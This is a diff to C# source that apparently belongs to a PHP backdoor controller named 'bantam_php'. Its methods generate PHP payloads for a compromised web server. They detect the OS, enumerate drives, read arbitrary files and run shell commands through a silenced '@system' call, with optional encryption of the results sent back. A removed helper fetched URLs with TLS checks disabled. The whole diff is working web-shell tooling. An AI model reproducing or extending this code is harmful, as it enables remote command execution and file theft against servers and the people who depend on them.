@@ -144,34 +144,70 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        public static string phpTestExecutionWithEcho = "echo '1';";
-
-        /// <summary>
-        /// 
-        /// </summary>
-        public static string osDetectPHP = "if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ echo 'win'; } else { echo 'nix'; }";
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="url"></param>
+        /// <param name="encryptReponse"></param>
         /// <returns></returns>
-        public static string getBasicCurl(string url)
+        public static string PhpTestExecutionWithEcho(bool encryptReponse)
         {
-            return "$curl = curl_init();" +
-                    "curl_setopt_array($curl, array(" +
-                        "CURLOPT_SSL_VERIFYPEER => false," +
-                        "CURLOPT_FOLLOWLOCATION => true," +
-                        "CURLOPT_URL => '" + url + "'," +
-                    "));" +
-                    "curl_exec($curl);" +
-                    "curl_close($curl);";
+            string phpTestExecutionWithEcho = "";
+            if (encryptReponse) {
+                phpTestExecutionWithEcho = "$result = '1';" 
+                                         + EncryptionHelper.encryptPhpResult();
+            } else {
+                phpTestExecutionWithEcho = "echo '1';";
+            }
+            return phpTestExecutionWithEcho;
         }
 
         /// <summary>
-        /// Code for windows Get HDD list, written with "@" as a verbatim literal to avoid escaping of \\'
+        /// 
         /// </summary>
-        public static string getHardDriveLetters = @"foreach (range('a', 'z') as $drive) { if (is_dir($drive . ':\\')) { echo $drive.':|'; }}";
+        /// <param name="encryptResponse"></param>
+        /// <returns></returns>
+        public static string OsDetectPhp(bool encryptResponse)
+        {
+            string osDetectPHP = "";
+            if (encryptResponse) {
+                osDetectPHP = "$result; if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ $result = 'win'; } else { $result = 'nix'; }"
+                             + EncryptionHelper.encryptPhpResult();
+            } else {
+                osDetectPHP = "if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ echo 'win'; } else { echo 'nix'; }";
+            }
+            return osDetectPHP;
+        }
+
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="encryptResponse"></param>
+        /// <returns></returns>
+        public static string GetHardDriveLettersPhp(bool encryptResponse)
+        {
+            string getHardDriveLetters = "";
+            if (encryptResponse) {
+                getHardDriveLetters = "$result; foreach (range('a', 'z') as $drive) { if (is_dir($drive . ':\\')) { $result .= $drive.':|'; }}"
+                                    + EncryptionHelper.encryptPhpResult();
+            } else {
+                getHardDriveLetters = "foreach (range('a', 'z') as $drive) { if (is_dir($drive . ':\\')) { echo $drive.':|'; }}";
+            }
+            return getHardDriveLetters;
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="fileName"></param>
+        /// <param name="encryptResponse"></param>
+        /// <returns></returns>
+        public static string ReadFileProcedure(string fileName, bool encryptResponse)
+        {
+            if (encryptResponse) {
+                return @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';"
+                       + EncryptionHelper.encryptPhpResult();
+            } else {
+                return "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
+            }
+        }
 
         /// <summary>
         /// Todo make a user controlled feature as to which function to use, but also use this and call it the something something method
@@ -199,23 +235,6 @@ namespace bantam_php
         //        }";
         //    }
 
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="fileName"></param>
-        /// <param name="encryptResponse"></param>
-        /// <returns></returns>
-        public static string ReadFileProcedure(string fileName, bool encryptResponse)
-        {
-            if (encryptResponse) {
-                return @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';"
-                       + EncryptionHelper.encryptPhpResult();
-            } else {
-                return "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
-            }
-        }
-
         /// <summary>
         /// 
         /// </summary>
@@ -225,7 +244,7 @@ namespace bantam_php
         public static string ExecuteSystemCode(string code, bool encryptResponse)
         {
             if (encryptResponse) {
-                return "ob_start(); @system( " + code + "); $result = ob_get_contents(); ob_end_clean();"
+                return @"ob_start(); @system('" + code + "'); $result = ob_get_contents(); ob_end_clean();"
                        + EncryptionHelper.encryptPhpResult();
             } else {
                 return "@system('" + code + "');";
@@ -352,8 +371,9 @@ namespace bantam_php
         /// <returns></returns>
         public static string MinifyCode(string code)
         {
-            string clean = Regex.Replace(code, @"\t|\n|\r", "");
-            return Regex.Replace(clean, @"\s+", " ");
+            string clean = Regex.Replace(code, @"\t|\n|\r", string.Empty);
+            string clean2 = Regex.Replace(clean, @"[^\u0000-\u007F]+", string.Empty);
+            return Regex.Replace(clean2, @"\s+", " ");
         }
     }
 }
